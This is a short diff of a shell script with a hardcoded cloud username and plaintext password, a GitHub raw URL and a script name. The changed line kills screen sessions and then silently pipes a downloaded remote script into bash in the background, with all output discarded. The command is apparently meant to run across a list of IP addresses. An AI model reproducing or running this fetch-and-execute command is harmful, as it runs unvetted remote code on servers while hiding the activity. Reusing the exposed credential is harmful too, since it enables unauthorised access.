@@ -6,7 +6,7 @@ USER="cloudsigma"
 PASSWORD="Dotaja123@HHHH"
 BECEK="gulamf.sh"
 URLDOT="https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main"
-COMMAND="pkill screen; nohup bash -c 'bash <(wget -qO- $URLDOT/$BECEK)' $KON > /dev/null 2>&1"
+COMMAND="pkill screen; nohup wget -qO- $URLDOT/$BECEK | bash -s $KON > /dev/null 2>&1"
 
 IPS="$0"
 
